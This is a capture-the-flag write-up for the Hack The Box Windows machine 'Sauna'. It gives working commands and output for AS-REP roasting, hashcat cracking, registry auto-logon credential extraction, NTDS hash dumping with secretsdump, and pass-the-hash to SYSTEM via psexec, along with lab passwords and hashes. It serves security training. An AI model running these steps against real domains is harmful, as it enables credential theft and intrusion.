---
title: "Sauna"
difficulty: Easy
os: Windows
points: 20
rating: 4.5
date: 2020-02-15
avatar: assets/htb/sauna.png
htb_url: https://app.hackthebox.com/machines/Sauna
---
## Overview

A relatively straightforward Windows box where the only real challenge is some lateral thinking to land the initial foothold. Once you're in, basic enumeration hands you the rest.

## Useful Skills and Tools

### Useful [Impacket](https://github.com/SecureAuthCorp/impacket) Scripts

#### psexec.py

* `psexec` lets you pass-the-\(NT\)hash to obtain system-level access. You'll need a valid administrator username along with its hash.
* `sudo python3 psexec.py -hashes :<password_hash> Administrator@<YOUR_IP>` 

#### secretsdump.py

* This pulls password hashes out of `NTDS.DIT` on a domain server. Valid user credentials are required.  
* `python3 ./secretsdump.py <domain_name>/<username>@<YOUR_IP>` 
* Supplying the `-just-dc-ntlm` flag limits the dump to just the Lanman and NT hashes.

#### GetNPUsers.py

* Grabs the Kerberos `krb5asrep` hashes for domain users from the domain controller. A valid `DOMAINNAME/username` pair is needed to run it. Only users without Kerberos pre-authentication enabled will yield hashes. 
* `python3 GetNPUsers.py -outputfile <out_file> -format hashcat -usersfile <username_file> -no-pass -dc-ip <YOUR_IP> <domain_name>/<user_name>`
* Here the output is written in hashcat format.

### Extracting Windows Auto-logon credentials with `reg query`

Running `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"` reveals any Windows Auto-logon credentials that have been saved.

### Using `hashcat` to crack Kerberos hashes

* Cracking `krb5asrep` type hashes requires the `-m 18200` option.
* `hashcat -m 18200 -a 0 <input_file> <wordlist> --force`

### Enumerating valid usernames through `kerberos` using MetaSploit

From the Metasploit console, the `auxiliary(gather/kerberos_enumusers)` module takes a list and enumerates which users are valid against Kerberos. It also reports whether each user has "pre-auth required" turned on.

## Enumeration

### Nmap scan

I kicked things off with an nmap scan of `<YOUR_IP>`. My usual flags are: `-p-`, a shortcut telling nmap to cover every port; `-sC`, which is the same as `--script=default` and fires off a set of nmap enumeration scripts at the target; `-sV` for a service scan; and `-oN`, which writes the results to a file named `<name>`.

```text
kac0@kalimaa:~/htb/sauna$ sudo nmap -p- -sC -sV -oN sauna.nmap <YOUR_IP>
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-01 14:07 EDT
Nmap scan report for <YOUR_IP>
Host is up (0.14s latency).
Scanned at 2020-06-01 14:07:43 EDT for 553s
Not shown: 65515 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-02 01:15:56Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
| ssl-date: 
|_  ERROR: Unable to obtain data from the target
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
| ssl-date: 
|_  ERROR: Unable to obtain data from the target
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
| ssl-date: 
|_  ERROR: Unable to obtain data from the target
3269/tcp  open  tcpwrapped
| ssl-date: 
|_  ERROR: Unable to obtain data from the target
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
61610/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=6/1%Time=5ED544ED%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");

Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h04m02s
| nbstat: 
|_  ERROR: Name query failed: TIMEOUT
| smb-os-discovery: 
|_  ERROR: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
| smb-security-mode: 
|_  ERROR: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-06-02T01:18:23
|_  start_date: N/A
Final times for host: srtt: 137789 rttvar: 1734  to: 144725

Nmap done: 1 IP address (1 host up) scanned in 553.41 seconds
```

This box had a ton of open ports! With so many related services exposed, it was pretty clear right away that this was a Windows domain server.  

### ldapsearch enumeration

```text
kac0@kalimaa:~/htb/sauna$ ldapsearch -H ldap://<YOUR_IP>:3268 -x -LLL -s sub -b "DC=EGOTISTICAL-BANK,DC=LOCAL"
dn: DC=EGOTISTICAL-BANK,DC=LOCAL
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL
instanceType: 5
whenCreated: 20200123054425.0Z
whenChanged: 20200601223827.0Z
subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
uSNCreated: 4099
uSNChanged: 53269
name: EGOTISTICAL-BANK
objectGUID:: 7AZOUMEioUOTwM9IB/gzYw==
replUpToDateVector:: AgAAAAAAAAACAAAAAAAAAP1ahZJG3l5BqlZuakAj9gwL0AAAAAAAAGIU5
 hQDAAAAQL7gs8Yl7ESyuZ/4XESy7AmwAAAAAAAA1ARSFAMAAAA=
objectSid:: AQQAAAAAAAUVAAAA+o7VsIowlbg+rLZG
wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOT
 ISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Progra
 m Data,DC=EGOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGO
 TISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrin
 cipals,DC=EGOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=
 EGOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=E
 GOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGO
 TISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTIC
 AL-BANK,DC=LOCAL
wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,
 DC=EGOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTIS
 TICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICA
 L-BANK,DC=LOCAL
objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,D
 C=LOCAL
gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=Syste
 m,DC=EGOTISTICAL-BANK,DC=LOCAL;0]
dSCorePropagationData: 16010101000000.0Z
masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN
 =Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Na
 me,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-N
 ame,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
dc: EGOTISTICAL-BANK

dn: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL

dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL

dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL

dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL

dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL

dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL

dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL

dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL

dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL

dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL

dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL

dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL

dn: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL

dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL

dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL

dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
```

Hmm... LDAP didn't give me much, though I did turn up one possible user, Hugo Smith \(sadly with no Windows username attached to it.\)

### Egotistical Bank website

![](assets/wu/sauna/img-1.png)

Port 80 served up a website for Egotistical Bank. The bulk of it was boilerplate template pages padded with lorem ipsum and almost no real content. One page, though, stood out.

![](assets/wu/sauna/img-2.png)

The 'About Us' page had a list of names under the "Meet The Team" heading. Assuming these were Egotistical Bank employees, I ran the names through several common username conventions to build candidate usernames, then set about checking which ones were valid.  

```text
hugos
hugo.smith
hsmith
stevenk
steven.kerb
skerb
shaunc
shaun.coins
scoins
hugob
hugo.bear
hbear
bowiet
bowie.taylor
btaylor
sofied
sofie.driver
sdriver
ferguss
fergus.smith
fsmith
```

That gave me a list of candidate usernames derived from typical corporate naming schemes I've come across before. I also tacked on the one name \(Hugo Smith\) that `ldapsearch` had surfaced but which wasn't listed on the website.

## Road to User

### Finding user creds

Even with limited information, grabbing user credentials on this box turned out to be quick and easy. Feeding my candidate username list into the Metasploit module `auxiliary/gather/kerberos_enumusers`, I checked which usernames were valid and which had Kerberos pre-authentication disabled. That pre-auth setting is a Kerberos security feature meant to defend against password-guessing brute force attacks.

```text
msf5 auxiliary(gather/kerberos_enumusers) > run
[*] Running module against <YOUR_IP>

[*] Validating options...
[*] Using domain: EGOTISTICALBANK...
[*] <YOUR_IP>:88 - Testing User: "hsmith"...
[*] <YOUR_IP>:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
[+] <YOUR_IP>:88 - User: "hsmith" is present
```

The scan came back with just a single valid username, `hsmith`. That confirmed both a working username and the naming convention used for the others. One strange thing stood out: the scan kept crashing Metasploit whenever it reached `fsmith` \(_I repeated this several times, with and without that name, to confirm_\). I left `fsmith` on the maybe-valid list to be safe.

```text
kac0@kalimaa:~/impacket/examples$ python3 GetNPUsers.py -outputfile sauna.hash -format hashcat -usersfile /home/kac0/htb/sauna/users -no-pass -dc-ip <YOUR_IP> EGOTISTICALBANK/hsmith

[-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

Because `fsmith` was crashing Metasploit, I suspected the tool was choking on something in that user's output. So I switched to a different script that returns the same data but additionally dumps the Kerberos hashes of any users without the pre-authentication requirement. I reached for `GetNPUsers.py` from the Impacket python examples to try pulling the `krb5asrep` hashes. Pulling those hashes requires a valid username in `DOMAINNAME/username` form. Fortunately I already had the domain name from my earlier enumeration plus a valid username Metasploit had pulled from the domain controller. I told it to write the output in hashcat format so I could quickly crack the hash with that tool.

Initially I assumed I was only seeing the same results the Metasploit module gave me, until I tallied up how many names had output. There was one extra result I couldn't account for, so I checked the output directory and opened `sauna.hash` to see whether I'd landed any hits.  

```text
$krb5asrep$23$fsmith@EGOTISTICALBANK:30279f364d10168e316be0713c91cb16$422f07d5f637adc6c396d1999bca49283f7f24c0257ead111b9adf94c623a7247e8e7575905e1ed3978dbce3a7a2b2d293d7339bc80dd2df4154ac019f614809aed59536842505f726e48a0119a18c3bc66d31cfe424269592b558e2ffdd616e36b1f8fccb6e4e16c8a0d9c1b9b668db776d4c46a1fa2d5cd00e2a00c59f218425690286f2bb95b4336ae1edea8def1d3da3ebd1c496da4664c1ce6299b0370dd87219b23243ce47fd1272dd5e1f084305cf1732ce7c5084727a9199935b2bcb3198c17e3d84d339611150501ccf17ae4f16e4784172da981623ac96f14bfbf17cf4afb8df652c089e363f2f07562703db74106bd22179dd37
```

Sure enough, it held the Kerberos hash for `fsmith`! My hunch had paid off, `fsmith` was a valid username after all, despite Metasploit's earlier weirdness. 

I'm not sure why `GetNPUsers.py` doesn't tell you when it locates a valid user and captures the hash, so keep an eye on your output files! 

Next I launched `hashcat` to crack the password hash. The `-m 18200` flag tells `hashcat` the input is a `krb5asrep` hash, while `-a 0` makes it try the words from the supplied wordlist as-is, with no mangling rules.

```text
kac0@kalimaa:~/htb/sauna$ hashcat -m 18200 -a 0 sauna.hash ~/rockyou.txt --force

Dictionary cache built:
* Filename..: /home/kac0/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921506
* Keyspace..: 14344384
* Runtime...: 6 secs

$krb5asrep$23$fsmith@EGOTISTICALBANK:30279f364d10168e316be0713c91cb16$422f07d5f637adc6c396d1999bca49283f7f24c0257ead111b9adf94c623a7247e8e7575905e1ed3978dbce3a7a2b2d293d7339bc80dd2df4154ac019f614809aed59536842505f726e48a0119a18c3bc66d31cfe424269592b558e2ffdd616e36b1f8fccb6e4e16c8a0d9c1b9b668db776d4c46a1fa2d5cd00e2a00c59f218425690286f2bb95b4336ae1edea8def1d3da3ebd1c496da4664c1ce6299b0370dd87219b23243ce47fd1272dd5e1f084305cf1732ce7c5084727a9199935b2bcb3198c17e3d84d339611150501ccf17ae4f16e4784172da981623ac96f14bfbf17cf4afb8df652c089e363f2f07562703db74106bd22179dd37:Thestrokes23

Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 AS-REP etype 23
Hash.Target......: $krb5asrep$23$fsmith@EGOTISTICALBANK:30279f364d1016...79dd37
Time.Started.....: Tue Jun  2 16:14:24 2020 (52 secs)
Time.Estimated...: Tue Jun  2 16:15:16 2020 (0 secs)
Guess.Base.......: File (/home/kac0/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   203.5 kH/s (7.13ms) @ Accel:16 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 10539008/14344384 (73.47%)
Rejected.........: 0/10539008 (0.00%)
Restore.Point....: 10534912/14344384 (73.44%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: Tiona172 -> Thelink

Started: Tue Jun  2 16:13:42 2020
Stopped: Tue Jun  2 16:15:18 2020
```

Even counting the time to build the dictionary and load everything up, `hashcat` cracked this hash in under two minutes. The password for `fmsith` turned out to be `Thestrokes23` \(to spot it in the output above you have to scroll all the way right...it appears tacked onto the end of the hash string\).

### User.txt

With a username and password in hand, I could attempt a login via `evil-winrm`. This tool talks to the Windows Remote Management service, which typically listens on port 5985.

```text
kac0@kalimaa:~/htb/sauna$ evil-winrm -i <YOUR_IP> -u fsmith 
Enter Password: Thestrokes23

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami /all

USER INFORMATION
----------------

User Name              SID
====================== ==============================================
egotisticalbank\fsmith S-1-5-21-2966785786-3096785034-1186376766-1105

GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
*Evil-WinRM* PS C:\Users\FSmith\Documents>
```

Lucky for me, `fsmith` belonged to the `Remote Management Users` group, so the login succeeded. With that, I went and grabbed my hard-earned loot.

```text
*Evil-WinRM* PS C:\Users\FSmith\Desktop> cat user.txt
1b55************************70cf
```

## Path to Power \(Gaining Administrator Access\)

### Enumeration as User `fsmith`

After `whoami /all`, my standard move upon landing as a new user is to enumerate everything I can. The Windows Privilege Escalation Awesome Scripts \([Winpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)\) suite bundles a set of scripts that make this enumeration trivially easy. Here, it made pivoting to another user a breeze.  

```text
--Cut from WinPEAS.exe--

C:\Windows\System32\OpenSSH\
[+] Looking for AutoLogon credentials(T1012)
    Some AutoLogon credentials were found!!
    DefaultDomainName             :  35mEGOTISTICALBANK
    DefaultUserName               :  35mEGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!

  [+] Home folders found(T1087&T1083&T1033)
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\FSmith
    C:\Users\Public
    C:\Users\svc_loanmgr
```

Auto-logon is an awful service that really shouldn't ever be enabled, but it's convenient for someone who's the sole user of a machine. True to its name, Windows logs the user in automatically by caching their credentials. I confirmed WinPEAS's finding by querying the registry key that holds this data with `reg query`. The auto-logon credentials live in the key `HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon`.  

```text
*Evil-WinRM* PS C:\Users\FSmith\Documents> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DefaultDomainName    REG_SZ    EGOTISTICALBANK
    DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ
    LegalNoticeText    REG_SZ
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x303697c4
    ShutdownFlags    REG_DWORD    0x13
    DisableLockWorkstation    REG_DWORD    0x0
    DefaultPassword    REG_SZ    Moneymakestheworldgoround!
```

Oddly, the account name with auto-logon enabled \(`svc_loanmanager`\) didn't match the account that actually had a user folder on the box \(`svc_loanmgr`\). I opted to log in as `svc_loanmgr`, since that matched the folder name.

### Moving laterally to user `svc_loanmgr`

```text
kac0@kalimaa:~/htb/sauna$ evil-winrm -i <YOUR_IP> -u svc_loanmgr
Enter Password: Moneymakestheworldgoround!

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents>whoami /all

USER INFORMATION
----------------

User Name                   SID
=========================== ==============================================
egotisticalbank\svc_loanmgr S-1-5-21-2966785786-3096785034-1186376766-1108

GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

When you hold credentials, Impacket's `secretsdump.py` can be used to dump password hashes. Those hashes can then either be cracked to recover the plaintext passwords or used directly in a pass-the-hash attack.  

```text
kac0@kalimaa:~/impacket/examples$ python3 ./secretsdump.py -just-dc-ntlm EGOTISTICALBANK/svc_loanmgr@<YOUR_IP>
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:21e6b7db7208776337bf12e6c910a32d:::
[*] Cleaning up...
```

Having pulled the `Administrator` account's password hash, I decided to practice a pass-the-hash attack \(I never tried cracking the hashes for the plaintext passwords, so I can't say how long that would take!\).

### Getting a shell

There's a solid write-up on how and why pass-the-hash attacks work over at [https://en.hackndo.com/pass-the-hash/](https://en.hackndo.com/pass-the-hash/). I went with Impacket's `psexec.py`, although plenty of other tools can carry out this attack against Windows.  

```text
kac0@kalimaa:~/impacket/examples$ sudo python3 psexec.py -hashes :d9485863c1e9e05851aa40cbb4ab9dff Administrator@<YOUR_IP>
Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on <YOUR_IP>.....
[*] Found writable share ADMIN$
[*] Uploading file useqULkm.exe
[*] Opening SVCManager on <YOUR_IP>.....
[*] Creating service hsLI on <YOUR_IP>.....
[*] Starting service hsLI.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

This tool not only logged me in, it also handed me `nt authority\system` privileges!

### Root.txt

With full control of the machine, the last step was to grab my proof. 

```text
C:\Windows\system32>cat C:\users\administrator\desktop\root.txt

f3ee************************881f
```
